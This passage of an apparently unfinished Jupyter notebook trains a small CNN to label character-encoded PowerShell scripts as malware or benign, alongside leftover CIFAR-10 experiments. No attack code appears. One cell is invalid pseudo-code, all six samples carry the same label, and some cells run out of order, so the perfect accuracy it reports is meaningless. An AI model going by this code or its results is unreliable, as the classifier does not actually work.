        "  # Create a DataFrame with zeros\n",
        "  df_zeros = pd.DataFrame(np.zeros((num_rows_to_add, df.shape[1])), columns=df.columns)\n",
        "\n",
        "  # Concatenate the original DataFrame and the DataFrame with zeros\n",
        "  return pd.concat([df, df_zeros], ignore_index=True)"
      ],
      "metadata": {
        "id": "oinKavoYcrgD"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "\n",
        "# Example sentence\n",
        "def EncodingPowerShellOutputDF (file_path):\n",
        "  with open(file_path, 'r') as file:\n",
        "      sentence = file.read().strip()\n",
        "      sentence = sentence[:1024]\n",
        "\n",
        "\n",
        "  # Create a list of characters from the sentence\n",
        "  characters = list(sentence)\n",
        "\n",
        "\n",
        "  # Create a DataFrame from the list of characters\n",
        "  df = pd.DataFrame(characters, columns=['Character'])\n",
        "  series_uppercase = df['Character'].apply(is_uppercase)\n",
        "\n",
        "  df_uppercase = series_uppercase.to_frame()\n",
        "\n",
        "  df_uppercase.columns = [\"uppercase\"]\n",
        "  df['Character'] = df['Character'].str.lower()\n",
        "  one_hot_encoded_df = encode_character_df(df.copy())\n",
        "\n",
        "  result = pd.concat([one_hot_encoded_df, df_uppercase], axis=1)\n",
        "  result = add_zeros_to_dataframe(result, 1024)\n",
        "  return result\n",
        "\n",
        "\n"
      ],
      "metadata": {
        "id": "_YV2zofisbfG"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "df Create_df_from_folder (folderpath){\n",
        "    #loop through folder\n",
        "    for :\n",
        "      df = EncodingPowerShellOutputDF\n",
        "\n",
        "    return df\n",
        "}"
      ],
      "metadata": {
        "id": "pxdlLgMA56dM"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "df_result_1 = EncodingPowerShellOutputDF('/content/test/1000_preprocessed.ps1')\n",
        "df_result_2 = EncodingPowerShellOutputDF('/content/test/1001_preprocessed.ps1')\n",
        "df_result_3 = EncodingPowerShellOutputDF('/content/test/1002_preprocessed.ps1')\n",
        "df_result_4 = EncodingPowerShellOutputDF('/content/test/100_preprocessed.ps1')\n",
        "df_result_5 = EncodingPowerShellOutputDF('/content/test/10_preprocessed.ps1')\n",
        "df_result_6 = EncodingPowerShellOutputDF('/content/test/1_preprocessed.ps1')\n",
        "combined_list = [df_result_1 , df_result_2 , df_result_3, df_result_4, df_result_5, df_result_6]\n",
        "combined_numpy_array = np.array(combined_list)\n"
      ],
      "metadata": {
        "id": "8N1ovLFfPmha"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "def Create_Y_label_1 (numpy_array):\n",
        "  array = np.array([[1]] * (numpy_array.shape[0]))\n",
        "  return array\n",
        "\n",
        "#combined label\n",
        "def Combine_Dataframe_3_dimension (arr):\n",
        "  m, n, p = arr.shape\n",
        "  ones_col = np.ones((m, n, 1))\n",
        "  arr = np.concatenate((arr, ones_col), axis=2)\n",
        "  return arr"
      ],
      "metadata": {
        "id": "KQr-C5NwkCEu"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "y = Create_Y_label_1(combined_numpy_array)\n",
        "print(type(y))\n",
        "X = combined_numpy_array\n"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "1LuBioVXxpJN",
        "outputId": "24319a62-41a1-4c72-d899-9d723438c07a"
      },
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "<class 'numpy.ndarray'>\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "\n",
        "X = np.expand_dims(X, axis=-1)\n",
        "# y = np.expand_dims(y, axis=-1)\n",
        "# y = to_categorical(y, num_classes=1)\n",
        "\n",
        "print(\"X shape: \" ,X.shape)\n",
        "print(\"y shape: \" ,y.shape)"
      ],
      "metadata": {
        "id": "BietM0zDxE_4",
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "outputId": "43b23d1b-b894-40f6-d6cb-fa5747cd56b8"
      },
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "X shape:  (6, 1024, 60, 1)\n",
            "y shape:  (6, 1)\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "print(X)"
      ],
      "metadata": {
        "id": "X7P-1rV6LEhL"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "#debug\n",
        "\n",
        "num_columns = combined_numpy_array.shape[0]\n",
        "print(\"Number of columns (Method 1):\", num_columns)\n",
        "\n",
        "print(combined_numpy_array[:1])\n",
        "print(combined_numpy_array.shape)"
      ],
      "metadata": {
        "id": "N1EXxj0Q6Nst",
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "outputId": "36cdd4db-6d7e-4f58-84cd-69b0f75a19c3"
      },
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Number of columns (Method 1): 6\n",
            "[[[0 0 0 ... 0 0 0.0]\n",
            "  [0 0 0 ... 0 0 1.0]\n",
            "  [0 0 0 ... 0 0 0.0]\n",
            "  ...\n",
            "  [0.0 0.0 0.0 ... 0.0 0.0 0.0]\n",
            "  [0.0 0.0 0.0 ... 0.0 0.0 0.0]\n",
            "  [0.0 0.0 0.0 ... 0.0 0.0 0.0]]]\n",
            "(6, 1024, 60)\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "(X_train, y_train), (X_test, y_test) = cifar10.load_data()\n"
      ],
      "metadata": {
        "id": "gOPDU2jN38Ol"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "print(\"X_train.shape : \",X_train.shape)\n",
        "print(\"y_train.shape: \", y_train.shape)\n",
        "\n",
        "\n",
        "\n",
        "# Normalize images to the range [0, 1].\n",
        "\n",
        "print(\"X_train.shape : \",X_train.shape)\n",
        "print(\"y_train.shape: \", y_train.shape)"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "UzzjZ-AoSBfV",
        "outputId": "ba2461a1-920f-418b-f0be-d6f2bd2f2140"
      },
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "X_train.shape :  (50000, 32, 32, 3)\n",
            "y_train.shape:  (50000, 1)\n",
            "X_train.shape :  (50000, 32, 32, 3)\n",
            "y_train.shape:  (50000, 1)\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "def cnn_model(input_shape=(32, 32, 3)):\n",
        "\n",
        "    model = Sequential()\n",
        "\n",
        "    #------------------------------------\n",
        "    # Conv Block 1: 32 Filters, MaxPool.\n",
        "    #------------------------------------\n",
        "    model.add(Conv2D(filters=32, kernel_size=3, padding='same', activation='relu', input_shape=input_shape))\n",
        "    model.add(Conv2D(filters=32, kernel_size=3, padding='same', activation='relu'))\n",
        "    model.add(MaxPooling2D(pool_size=(2, 2)))\n",
        "\n",
        "    #------------------------------------\n",
        "    # Conv Block 2: 64 Filters, MaxPool.\n",
        "    #------------------------------------\n",
        "    model.add(Conv2D(filters=64, kernel_size=3, padding='same', activation='relu'))\n",
        "    model.add(Conv2D(filters=64, kernel_size=3, padding='same', activation='relu'))\n",
        "    model.add(MaxPooling2D(pool_size=(2, 2)))\n",
        "\n",
        "    #------------------------------------\n",
        "    # Conv Block 3: 64 Filters, MaxPool.\n",
        "    #------------------------------------\n",
        "    model.add(Conv2D(filters=64, kernel_size=3, padding='same', activation='relu'))\n",
        "    model.add(Conv2D(filters=64, kernel_size=3, padding='same', activation='relu'))\n",
        "    model.add(MaxPooling2D(pool_size=(2, 2)))\n",
        "\n",
        "    #------------------------------------\n",
        "    # Flatten the convolutional features.\n",
        "    #------------------------------------\n",
        "    model.add(Flatten())\n",
        "    model.add(Dense(512, activation='relu'))\n",
        "    model.add(Dense(10, activation='softmax'))\n",
        "\n",
        "    return model\n",
        "\n",
        "\n",
        "  # Create the model.\n",
        "model = cnn_model()\n",
        "model.summary()"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "tGT5ZRYqQf20",
        "outputId": "a1e80f69-cfa2-4b3e-cab7-4deaed423629"
      },
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Model: \"sequential_12\"\n",
            "_________________________________________________________________\n",
            " Layer (type)                Output Shape              Param #   \n",
            "=================================================================\n",
            " conv2d_67 (Conv2D)          (None, 32, 32, 32)        896       \n",
            "                                                                 \n",
            " conv2d_68 (Conv2D)          (None, 32, 32, 32)        9248      \n",
            "                                                                 \n",
            " max_pooling2d_7 (MaxPoolin  (None, 16, 16, 32)        0         \n",
            " g2D)                                                            \n",
            "                                                                 \n",
            " conv2d_69 (Conv2D)          (None, 16, 16, 64)        18496     \n",
            "                                                                 \n",
            " conv2d_70 (Conv2D)          (None, 16, 16, 64)        36928     \n",
            "                                                                 \n",
            " max_pooling2d_8 (MaxPoolin  (None, 8, 8, 64)          0         \n",
            " g2D)                                                            \n",
            "                                                                 \n",
            " conv2d_71 (Conv2D)          (None, 8, 8, 64)          36928     \n",
            "                                                                 \n",
            " conv2d_72 (Conv2D)          (None, 8, 8, 64)          36928     \n",
            "                                                                 \n",
            " max_pooling2d_9 (MaxPoolin  (None, 4, 4, 64)          0         \n",
            " g2D)                                                            \n",
            "                                                                 \n",
            " flatten_10 (Flatten)        (None, 1024)              0         \n",
            "                                                                 \n",
            " dense_8 (Dense)             (None, 512)               524800    \n",
            "                                                                 \n",
            " dense_9 (Dense)             (None, 10)                5130      \n",
            "                                                                 \n",
            "=================================================================\n",
            "Total params: 669354 (2.55 MB)\n",
            "Trainable params: 669354 (2.55 MB)\n",
            "Non-trainable params: 0 (0.00 Byte)\n",
            "_________________________________________________________________\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "@dataclass(frozen=True)\n",
        "class DatasetConfig_result:\n",
        "  #Number of types (malware vs benign) -> 2\n",
        "    NUM_CLASSES:  int = 2\n",
        "    IMG_HEIGHT:   int = 1024\n",
        "    IMG_WIDTH:    int = 60\n",
        "    NUM_CHANNELS: int = 1\n",
        "\n",
        "@dataclass(frozen=True)\n",
        "class TrainingConfig_result:\n",
        "    EPOCHS:        int = 16\n",
        "    BATCH_SIZE:    int = 128\n",
        "    LEARNING_RATE: float = 0.001"
      ],
      "metadata": {
        "id": "QztvQHhZH6_0"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "def cnn_model_result(input_shape=(1024, 60, 1)):\n",
        "\n",
        "    model = Sequential()\n",
        "\n",
        "    #------------------------------------\n",
        "    # Conv Block 1: 32 Filters, MaxPool.\n",
        "    #------------------------------------\n",
        "    model.add(Conv2D(filters=32, kernel_size=3, padding='same', activation='relu', input_shape=input_shape))\n",
        "    model.add(Conv2D(filters=32, kernel_size=3, padding='same', activation='relu'))\n",
        "    model.add(MaxPooling2D(pool_size=(3)))\n",
        "\n",
        "    #------------------------------------\n",
        "    # Conv Block 2: 64 Filters, MaxPool.\n",
        "    #------------------------------------\n",
        "    model.add(Conv2D(filters=64, kernel_size=3, padding='same', activation='relu'))\n",
        "    model.add(Conv2D(filters=64, kernel_size=3, padding='same', activation='relu'))\n",
        "    # model.add(MaxPooling2D(pool_size=(3)))\n",
        "\n",
        "    #------------------------------------\n",
        "    # Conv Block 3: 64 Filters, MaxPool.\n",
        "    #------------------------------------\n",
        "    model.add(Conv2D(filters=64, kernel_size=3, padding='same', activation='relu'))\n",
        "    model.add(Conv2D(filters=64, kernel_size=3, padding='same', activation='relu'))\n",
        "    # model.add(MaxPooling2D(pool_size=(3)))\n",
        "\n",
        "    #------------------------------------\n",
        "    # Flatten the convolutional features.\n",
        "    #------------------------------------\n",
        "    model.add(Flatten())\n",
        "    # model.add(Dense(512, activation='relu'))\n",
        "    # model.add(Dense(2, activation='softmax'))\n",
        "\n",
        "    return model"
      ],
      "metadata": {
        "id": "0Nk3M-7QJK-o"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "# Create the model.\n",
        "model_result = cnn_model_result()\n",
        "model_result.summary()"
      ],
      "metadata": {
        "id": "kQVsdmQeJcsr"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "model_result.compile(optimizer='rmsprop',\n",
        "              loss='categorical_crossentropy',\n",
        "              metrics=['accuracy'],\n",
        "             )"
      ],
      "metadata": {
        "id": "3awNhx-VO-8v"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [],
      "metadata": {
        "id": "R71E8wQ8zwCK",
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "outputId": "629af122-5484-41c1-9a77-7b3f0b124a7b"
      },
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "(6, 1024, 60, 1)\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "\n",
        "\n",
        "history = model_result.fit(X_float,\n",
        "                    y_float,\n",
        "                    batch_size=TrainingConfig_result.BATCH_SIZE,\n",
        "                    epochs=TrainingConfig_result.EPOCHS,\n",
        "                    verbose=1,\n",
        "                    validation_split=.3,\n",
        "                   )\n",
        "\n",
        "\n"
      ],
      "metadata": {
        "id": "JzhdQbx4PCNr"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "X_float = X.astype('float32')\n",
        "print(X_float.shape)\n",
        "print(X_train.shape)\n",
        "print(type(X_float))\n",
        "print(type(X_train))\n",
        "\n",
        "# y_float = y.astype('float32')/\n",
        "y_float = to_categorical(y)\n",
        "print(y_float.shape)"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "P9mw3ITjQUSz",
        "outputId": "d94d9c38-4720-4957-b19a-8e5ad5d04a07"
      },
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "(6, 1024, 60, 1)\n",
            "(50000, 32, 32, 3)\n",
            "<class 'numpy.ndarray'>\n",
            "<class 'numpy.ndarray'>\n",
            "(6, 2)\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "# Create the model.\n",
        "(X_train, y_train), (X_test, y_test) = cifar10.load_data()\n",
        "\n",
        "# Normalize images to the range [0, 1].\n",
        "X_train = X_train.astype(\"float32\") / 255\n",
        "X_test  = X_test.astype(\"float32\") / 255\n",
        "\n",
        "# Change the labels from integer to categorical data.\n",
        "print('Original (integer) label for the first training sample: ', y_train[0])\n",
        "\n",
        "# # Convert labels to one-hot encoding.\n",
        "print (y_train.shape)\n",
        "y_train = to_categorical(y_train)\n",
        "y_test  = to_categorical(y_test)\n",
        "\n",
        "print (y_train.shape)"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "IllLsGgcciY6",
        "outputId": "7776f27f-bc5f-47bd-e3be-83859d7d6ca9"
      },
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Original (integer) label for the first training sample:  [6]\n",
            "(50000, 1)\n",
            "(50000, 10)\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "\n",
        "@dataclass(frozen=True)\n",
        "class DatasetConfig:\n",
        "    NUM_CLASSES:  int = 10\n",
        "    IMG_HEIGHT:   int = 32\n",
        "    IMG_WIDTH:    int = 32\n",
        "    NUM_CHANNELS: int = 3\n",
        "\n",
        "@dataclass(frozen=True)\n",
        "class TrainingConfig:\n",
        "    EPOCHS:        int = 31\n",
        "    BATCH_SIZE:    int = 256\n",
        "    LEARNING_RATE: float = 0.001\n",
        "\n",
        "\n",
        "\n",
        "print('After conversion to categorical one-hot encoded labels: ', y_train[0])\n",
        "\n",
        "def cnn_model_result(input_shape=(1024, 60, 1)):\n",
        "    model = Sequential()\n",
        "    # ------------------------------------\n",
        "    # Conv Block 1: 32 Filters, MaxPool.\n",
        "    # ------------------------------------\n",
        "    model.add(Conv2D(filters=1, kernel_size=2, padding='same', activation='relu', input_shape=input_shape))\n",
        "    model.add(Conv2D(filters=1, kernel_size=1, padding='same', activation='relu'))\n",
        "    model.add(MaxPooling2D(pool_size=(3)))\n",
        "\n",
        "    #------------------------------------\n",
        "    # Conv Block 2: 64 Filters, MaxPool.\n",
        "    #------------------------------------\n",
        "    model.add(Conv2D(filters=1, kernel_size=1, padding='same', activation='relu'))\n",
        "    model.add(Conv2D(filters=1, kernel_size=1, padding='same', activation='relu'))\n",
        "    # model.add(MaxPooling2D(pool_size=(3)))\n",
        "\n",
        "    #------------------------------------\n",
        "    # Conv Block 3: 64 Filters, MaxPool.\n",
        "    #------------------------------------\n",
        "    model.add(Conv2D(filters=1, kernel_size=1, padding='same', activation='relu'))\n",
        "    model.add(Conv2D(filters=1, kernel_size=1, padding='same', activation='relu'))\n",
        "    # model.add(MaxPooling2D(pool_size=(3)))\n",
        "\n",
        "    #------------------------------------\n",
        "    # Flatten the convolutional features.\n",
        "    #------------------------------------\n",
        "    model.add(Flatten())\n",
        "    model.add(Dense(512, activation='relu'))\n",
        "    model.add(Dense(2, activation='softmax'))\n",
        "\n",
        "    #  model = Sequential()\n",
        "     #//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////\n",
        "    #------------------------------------\n",
        "    # Conv Block 1: 32 Filters, MaxPool.\n",
        "    #------------------------------------\n",
        "    # model.add(Conv2D(filters=32, kernel_size=3, padding='same', activation='relu', input_shape=input_shape))\n",
        "    # model.add(Conv2D(filters=32, kernel_size=3, padding='same', activation='relu'))\n",
        "    # model.add(MaxPooling2D(pool_size=(2, 2)))\n",
        "\n",
        "    # #------------------------------------\n",
        "    # # Conv Block 2: 64 Filters, MaxPool.\n",
        "    # #------------------------------------\n",
        "    # model.add(Conv2D(filters=64, kernel_size=3, padding='same', activation='relu'))\n",
        "    # model.add(Conv2D(filters=64, kernel_size=3, padding='same', activation='relu'))\n",
        "    # model.add(MaxPooling2D(pool_size=(2, 2)))\n",
        "\n",
        "    # #------------------------------------\n",
        "    # # Conv Block 3: 64 Filters, MaxPool.\n",
        "    # #------------------------------------\n",
        "    # model.add(Conv2D(filters=64, kernel_size=3, padding='same', activation='relu'))\n",
        "    # model.add(Conv2D(filters=64, kernel_size=3, padding='same', activation='relu'))\n",
        "    # model.add(MaxPooling2D(pool_size=(2, 2)))\n",
        "\n",
        "    # #------------------------------------\n",
        "    # # Flatten the convolutional features.\n",
        "    # #------------------------------------\n",
        "    # model.add(Flatten())\n",
        "    # model.add(Dense(512, activation='relu'))\n",
        "    # model.add(Dense(10, activation='softmax'))\n",
        "\n",
        "    return model\n",
        "\n",
        "model_result = cnn_model_result()\n",
        "model_result.summary()\n",
        "model_result.compile(optimizer='rmsprop',\n",
        "              loss='categorical_crossentropy',\n",
        "              metrics=['accuracy'],\n",
        "             )\n",
        "\n",
        "\n",
        "\n",
        "history = model_result.fit(X_float,\n",
        "                    y_float,\n",
        "                    batch_size=TrainingConfig_result.BATCH_SIZE,\n",
        "                    epochs=TrainingConfig_result.EPOCHS,\n",
        "                    verbose=1,\n",
        "                    validation_split=.3,\n",
        "                   )\n",
        "\n",
        "\n"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "cdUIcAfbO40H",
        "outputId": "096c4b9f-59e9-445e-da60-8148bc519c6d"
      },
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "After conversion to categorical one-hot encoded labels:  [6]\n",
            "Model: \"sequential_9\"\n",
            "_________________________________________________________________\n",
            " Layer (type)                Output Shape              Param #   \n",
            "=================================================================\n",
            " conv2d_54 (Conv2D)          (None, 1024, 60, 1)       5         \n",
            "                                                                 \n",
            " conv2d_55 (Conv2D)          (None, 1024, 60, 1)       2         \n",
            "                                                                 \n",
            " max_pooling2d_21 (MaxPooli  (None, 341, 20, 1)        0         \n",
            " ng2D)                                                           \n",
            "                                                                 \n",
            " conv2d_56 (Conv2D)          (None, 341, 20, 1)        2         \n",
            "                                                                 \n",
            " conv2d_57 (Conv2D)          (None, 341, 20, 1)        2         \n",
            "                                                                 \n",
            " conv2d_58 (Conv2D)          (None, 341, 20, 1)        2         \n",
            "                                                                 \n",
            " conv2d_59 (Conv2D)          (None, 341, 20, 1)        2         \n",
            "                                                                 \n",
            " flatten_7 (Flatten)         (None, 6820)              0         \n",
            "                                                                 \n",
            " dense_16 (Dense)            (None, 512)               3492352   \n",
            "                                                                 \n",
            " dense_17 (Dense)            (None, 2)                 1026      \n",
            "                                                                 \n",
            "=================================================================\n",
            "Total params: 3493393 (13.33 MB)\n",
            "Trainable params: 3493393 (13.33 MB)\n",
            "Non-trainable params: 0 (0.00 Byte)\n",
            "_________________________________________________________________\n",
            "Epoch 1/16\n",
            "1/1 [==============================] - 1s 1s/step - loss: 0.6931 - accuracy: 0.0000e+00 - val_loss: 0.6900 - val_accuracy: 1.0000\n",
            "Epoch 2/16\n",
            "1/1 [==============================] - 0s 148ms/step - loss: 0.6900 - accuracy: 1.0000 - val_loss: 0.6877 - val_accuracy: 1.0000\n",
            "Epoch 3/16\n",
            "1/1 [==============================] - 0s 154ms/step - loss: 0.6877 - accuracy: 1.0000 - val_loss: 0.6858 - val_accuracy: 1.0000\n",
            "Epoch 4/16\n",
            "1/1 [==============================] - 0s 152ms/step - loss: 0.6858 - accuracy: 1.0000 - val_loss: 0.6841 - val_accuracy: 1.0000\n",
            "Epoch 5/16\n",
            "1/1 [==============================] - 0s 142ms/step - loss: 0.6841 - accuracy: 1.0000 - val_loss: 0.6826 - val_accuracy: 1.0000\n",
            "Epoch 6/16\n",
            "1/1 [==============================] - 0s 150ms/step - loss: 0.6826 - accuracy: 1.0000 - val_loss: 0.6811 - val_accuracy: 1.0000\n",
            "Epoch 7/16\n",
            "1/1 [==============================] - 0s 153ms/step - loss: 0.6811 - accuracy: 1.0000 - val_loss: 0.6798 - val_accuracy: 1.0000\n",
            "Epoch 8/16\n",
            "1/1 [==============================] - 0s 161ms/step - loss: 0.6798 - accuracy: 1.0000 - val_loss: 0.6785 - val_accuracy: 1.0000\n",
            "Epoch 9/16\n",
            "1/1 [==============================] - 0s 143ms/step - loss: 0.6785 - accuracy: 1.0000 - val_loss: 0.6772 - val_accuracy: 1.0000\n",
            "Epoch 10/16\n",
            "1/1 [==============================] - 0s 155ms/step - loss: 0.6772 - accuracy: 1.0000 - val_loss: 0.6760 - val_accuracy: 1.0000\n",
            "Epoch 11/16\n",
            "1/1 [==============================] - 0s 138ms/step - loss: 0.6760 - accuracy: 1.0000 - val_loss: 0.6748 - val_accuracy: 1.0000\n",
            "Epoch 12/16\n",
            "1/1 [==============================] - 0s 148ms/step - loss: 0.6748 - accuracy: 1.0000 - val_loss: 0.6737 - val_accuracy: 1.0000\n",
            "Epoch 13/16\n",
            "1/1 [==============================] - 0s 144ms/step - loss: 0.6737 - accuracy: 1.0000 - val_loss: 0.6726 - val_accuracy: 1.0000\n",
            "Epoch 14/16\n",
            "1/1 [==============================] - 0s 144ms/step - loss: 0.6726 - accuracy: 1.0000 - val_loss: 0.6715 - val_accuracy: 1.0000\n",
            "Epoch 15/16\n",
            "1/1 [==============================] - 0s 146ms/step - loss: 0.6715 - accuracy: 1.0000 - val_loss: 0.6704 - val_accuracy: 1.0000\n",
            "Epoch 16/16\n",
            "1/1 [==============================] - 0s 165ms/step - loss: 0.6704 - accuracy: 1.0000 - val_loss: 0.6693 - val_accuracy: 1.0000\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "def plot_results(metrics, title=None, ylabel=None, ylim=None, metric_name=None, color=None):\n",
        "\n",
        "    fig, ax = plt.subplots(figsize=(15, 4))\n",
        "\n",
        "    if not (isinstance(metric_name, list) or isinstance(metric_name, tuple)):\n",
        "        metrics = [metrics,]\n",
        "        metric_name = [metric_name,]\n",
        "\n",
        "    for idx, metric in enumerate(metrics):\n",
        "        ax.plot(metric, color=color[idx])\n",
        "\n",
        "    plt.xlabel(\"Epoch\")\n",
        "    plt.ylabel(ylabel)\n",
        "    plt.title(title)\n",
        "    plt.xlim([0, TrainingConfig.EPOCHS-1])\n",
        "    plt.ylim(ylim)\n",
        "    # Tailor x-axis tick marks\n",
        "    ax.xaxis.set_major_locator(MultipleLocator(5))\n",
        "    ax.xaxis.set_major_formatter(FormatStrFormatter('%d'))\n",
        "    ax.xaxis.set_minor_locator(MultipleLocator(1))\n",
        "    plt.grid(True)\n",
        "    plt.legend(metric_name)\n",
        "    plt.show()\n",
        "    plt.close()"
      ],
      "metadata": {
        "id": "rihk6A31e2mJ"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "train_loss = history.history[\"loss\"]\n",
        "train_acc  = history.history[\"accuracy\"]\n",
        "valid_loss = history.history[\"val_loss\"]\n",
        "valid_acc  = history.history[\"val_accuracy\"]\n",
        "\n",
        "plot_results([ train_loss, valid_loss ],\n",
        "            ylabel=\"Loss\",\n",
        "            ylim = [0.0, 5.0],\n",
        "            metric_name=[\"Training Loss\", \"Validation Loss\"],\n",
        "            color=[\"g\", \"b\"]);\n",
        "\n",
        "plot_results([ train_acc, valid_acc ],\n",
        "            ylabel=\"Accuracy\",\n",
        "            ylim = [0.0, 1.0],\n",
        "            metric_name=[\"Training Accuracy\", \"Validation Accuracy\"],\n",
        "            color=[\"g\", \"b\"])"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/",
          "height": 789
        },
        "id": "RPcJ93zafDOj",
        "outputId": "8eb704b6-39a3-4e64-8e39-505adfe0ecae"
      },
      "execution_count": null,
      "outputs": [
        {
          "output_type": "display_data",
          "data": {
            "text/plain": [
              "<Figure size 1500x400 with 1 Axes>"
            ],
            "image/png": "[encoded data removed]"
          },
          "metadata": {}
        },
        {
          "output_type": "display_data",
          "data": {
            "text/plain": [
              "<Figure size 1500x400 with 1 Axes>"
            ],
            "image/png": "[encoded data removed]"
          },
          "metadata": {}
        }
      ]
    }
  ]
}